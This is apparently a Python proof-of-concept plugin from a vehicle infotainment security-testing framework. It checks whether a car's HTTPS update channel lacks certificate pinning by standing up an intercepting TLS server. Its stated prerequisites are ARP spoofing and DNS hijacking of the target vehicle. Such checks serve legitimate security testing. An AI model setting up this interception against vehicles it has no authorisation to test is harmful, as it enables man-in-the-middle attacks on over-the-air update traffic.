"""
PoC Name: HTTPS Missing Certificate Pinning
CVE: N/A
Component: Network Stack
Category: Network
Severity: Medium
CVSS: 5.5
Description: 检测HTTPS更新通道是否缺少证书固定
Prerequisites: 已经对目标车辆执行了 ARP 欺骗和 DNS 劫持，将外连域名解析到测试机 IP，并传入 target_ip 作为测试绑定的本机网卡。
Usage: python3 20_HTTPS_No_Cert_Pin.py <local_bind_ip>
"""
import sys
import ssl
import socket
from iv_plugin_base import IVIVulnerabilityPlugin

class CertPinningPlugin(IVIVulnerabilityPlugin):
    meta_poc_name = "HTTPS No Cert Pin"
    meta_cve_id = "N/A"
    meta_severity = "Medium"
    meta_protocol = "tcp"
    meta_target_os = ["all"]
    meta_required_params = ["target_ip"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        # target_ip 在这个上下文中，代表我们绑定的监听IP (也可以是 0.0.0.0)
        self.bind_ip = self.params.get("target_ip", "0.0.0.0")
        self.listen_port = int(self.params.get("listen_port", 4443))
        self.certfile = self.params.get("certfile")
        self.keyfile = self.params.get("keyfile")
        if not self.bind_ip or self.bind_ip == "N/A":
             self.bind_ip = "0.0.0.0"
        return True

    def _build_tls_context(self):
        if not self.certfile or not self.keyfile:
            return None
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
        return context

    def exploit(self):
        self.logger.info("准备检测目标客户端(IVI)在 OTA 等云端通信时是否存在证书固定(Pinning)漏洞...")

        # 仅在目标完成真实 TLS 握手并继续发送 HTTP 应用层数据时，才能说明其接受了当前证书。
        # 若未提供测试证书，则只能采集 ClientHello，无法证明“缺少证书固定”。
        sock = None
        try:
            tls_context = self._build_tls_context()
            self.logger.info(f"启动 TLS 分析监听 {self.bind_ip}:{self.listen_port} 模拟云端...")
            self.logger.warning("注：需要预先使用 DNS 劫持 (例如 Dnsmasq) 将 OEM 升级域名指向本机。")

            if tls_context is None:
                self.logger.warning(
                    "未提供 certfile/keyfile。当前仅能被动抓取 ClientHello，不能据此判定缺少证书固定。"
                )

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.bind_ip, self.listen_port))
            sock.listen(1)
            sock.settimeout(10.0)

            self.logger.info("等待车机发起 HTTPS (TCP) 握手连接 (超时 10s)...")

            try:
                conn, addr = sock.accept()
                self.logger.info(f"[+] 捕获到目标流入的 HTTPS 会话拦截，源地址: {addr}")

                if tls_context is None:
                    conn.settimeout(3.0)
                    client_hello = conn.recv(1024)
                    if client_hello and client_hello[0] == 0x16:
                        return {
                            "status": "success",
                            "vulnerable": False,
                            "details": (
                                f"Captured TLS ClientHello from {addr[0]}:{addr[1]}, but no test certificate was "
                                "provided, so certificate pinning could not be verified."
                            ),
                        }
                    return {
                        "status": "success",
                        "vulnerable": False,
                        "details": "TCP connection captured, but no valid TLS handshake data received.",
                    }

                try:
                    tls_conn = tls_context.wrap_socket(conn, server_side=True)
                    tls_conn.settimeout(3.0)
                    request = tls_conn.recv(1024)
                    if request:
                        self.logger.warning("[!] 目标完成了 TLS 握手并继续发送应用层数据。")
                        return {
                            "status": "success",
                            "vulnerable": True,
                            "details": (
                                "Target completed TLS handshake and sent application data to the interception "
                                "endpoint. This indicates it accepted the presented test certificate."
                            ),
                        }
                    return {
                        "status": "success",
                        "vulnerable": False,
                        "details": "TLS handshake completed but no HTTP request followed; result inconclusive.",
                    }
                except ssl.SSLError as e:
                    self.logger.info(f"TLS 握手被客户端拒绝: {e}")
                    return {
                        "status": "success",
                        "vulnerable": False,
                        "details": f"Target rejected the presented certificate during TLS handshake: {e}",
                    }
                finally:
                    conn.close()

            except socket.timeout:
                self.logger.info("时限到达。10秒内未检测到来自车辆的通信连接请求。")
                return {
                    "status": "success",
                    "vulnerable": False,
                    "details": "No incoming HTTPS connection from vehicle during 10s window."
                }
                
        except Exception as e:
             self.logger.error(f"Execution Error: {str(e)}")
             return {"status": "error", "details": str(e)}
        finally:
             if sock is not None:
                 sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 20_HTTPS_No_Cert_Pin.py <local_bind_ip> [certfile keyfile]")
        sys.exit(1)
    params = {"target_ip": sys.argv[1]}
    if len(sys.argv) >= 4:
        params["certfile"] = sys.argv[2]
        params["keyfile"] = sys.argv[3]
    plugin = CertPinningPlugin(params)
    plugin.run_verify()
